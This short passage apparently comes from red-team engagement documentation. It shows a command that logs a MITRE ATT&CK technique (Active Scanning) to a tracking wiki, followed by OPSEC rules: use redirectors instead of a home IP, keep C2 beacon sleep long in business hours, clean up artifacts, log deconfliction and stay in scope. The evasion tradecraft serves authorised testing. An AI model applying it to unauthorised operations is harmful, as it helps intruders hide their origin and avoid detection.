## TTP Logging

After each action:
```bash
python3 tools/state.py ttp \
  --id T1595 \
  --name "Active Scanning" \
  --tactic "Reconnaissance" \
  --result "SUCCESS" \
  --notes "Discovered 3 web servers, 1 FTP open"
```

Auto-updates wiki/ttp-matrix.md.

---

## OPSEC Rules

1. Never operate from home IP — use VPS or redirector
2. Beacon sleep ≥ 60s in business hours
3. Clean up artifacts before moving to next host
4. Maintain deconfliction: `python3 tools/deconflict.py --log $ACTION`
5. Screenshot timestamps for report timeline
6. Never access out-of-scope systems even if reachable
